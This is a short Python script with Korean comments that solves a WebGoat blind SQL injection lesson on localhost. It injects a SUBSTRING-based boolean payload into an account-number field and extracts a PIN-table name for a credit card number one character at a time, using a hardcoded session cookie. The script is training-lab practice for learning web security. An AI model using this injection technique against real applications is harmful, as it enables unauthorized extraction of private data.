from requests import post # 값 전달과 읽기를 위한 requests 모듈 불러오기

uri = 'http://127.0.0.1:8080/WebGoat/attack?Screen=1315528047&menu=1100' # 값을 전달할 대상
payload = "101 and (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'),{},1)='{}');" # payload 문자열을 1개씩 짤라서 비교한다
params = {'account_number':'', 'SUBMIT':'Go!'} # post로 전달할 인자값
session = {'JSESSIONID':'ADD1A83FBD4479857023514A6A496B5A'} # 로그인을 유지하려면 세션이 필요하기 때문에 쿠키 값 저장

flag = '' # 문자를 1개씩 찾아 나중엔 완성될 flag 변수

for x in range(1, 50): # 넉넉하게 50번 반복
	for y in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ': # 원래 ord와 chr를 이용해서 구현하려 했으나 잦은 오류로 이렇게 구현
		params['account_number'] = payload.format(x, y) # params에 있는 account_number에 payload 값을 하나씩 변경 해주면서 대입
		
		r = post(uri, data = params, cookies = session).text # post 형식으로 전송하고 읽어오기

		if(r.find('Account number is valid') != -1): # if Account number is valid라는 값이 나오면 다음 명령 실행 
													#(-1이 아닐 떄라고 하는 이유는 저 문자열이 없을 떄 -1을 반환하기 때문에)
			flag += y # 찾은 문자 flag에 추가
			print(flag) # 확인차 출력
			break # 다시 위에 for문 돌기

		if(y == 'Z') : # 위에 break문에서 for문을 못빠져 나갔으면 flag가 완성된거기 때문에
			exit(0) # 프로그램 종료